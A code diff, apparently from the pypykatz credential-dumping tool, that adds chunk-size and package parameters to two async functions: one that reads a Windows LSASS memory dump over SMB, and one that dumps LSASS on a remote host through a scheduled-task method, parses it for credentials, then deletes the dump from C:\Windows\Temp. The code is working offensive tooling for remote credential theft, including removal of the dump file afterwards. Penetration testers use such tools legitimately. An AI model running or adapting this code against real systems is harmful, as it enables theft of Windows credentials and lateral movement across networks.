@@ -3,7 +3,7 @@ import os
 
 from pypykatz import logging
 
-async def lsassfile(url):
+async def lsassfile(url, packages = ['all'], chunksize = 64*1024):
 	from aiosmb.commons.connection.url import SMBConnectionURL
 	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
 	from pypykatz.apypykatz import apypykatz
@@ -26,11 +26,11 @@ async def lsassfile(url):
 		
 		logging.debug('[LSASSFILE] LSASS file opened!')
 		logging.debug('[LSASSFILE] parsing LSASS file...')
-		mimi = await apypykatz.parse_minidump_external(SMBFileReader(smbfile))
+		mimi = await apypykatz.parse_minidump_external(SMBFileReader(smbfile), chunksize=chunksize, packages = packages)
 		logging.debug('[LSASSFILE] LSASS file parsed OK!')
 		return mimi
 
-async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\',):
+async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\',chunksize = 64*1024, packages = ['all']):
 	from aiosmb.commons.exceptions import SMBException
 	from aiosmb.wintypes.ntstatus import NTStatus
 	from aiosmb.commons.connection.url import SMBConnectionURL
@@ -97,7 +97,7 @@ async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\T
 		
 		logging.debug('[LSASSDUMP] LSASS dump file opened!')
 		logging.debug('[LSASSDUMP] parsing LSASS dump file on the remote host...')
-		mimi = await apypykatz.parse_minidump_external(smbfile)
+		mimi = await apypykatz.parse_minidump_external(smbfile, chunksize=chunksize, packages = packages)
 
 		logging.debug('[LSASSDUMP] parsing OK!')
 		logging.debug('[LSASSDUMP] Deleting remote dump file...')
@@ -105,6 +105,6 @@ async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\T
 		if err is not None:
 			logging.info('[LSASSDUMP] Failed to delete LSASS file! Reason: %s' % err)
 		else:
-			logging.debug('[LSASSDUMP] remote LSASS file deleted OK!')
+			logging.info('[LSASSDUMP] remote LSASS file deleted OK!')
 	
 	return mimi
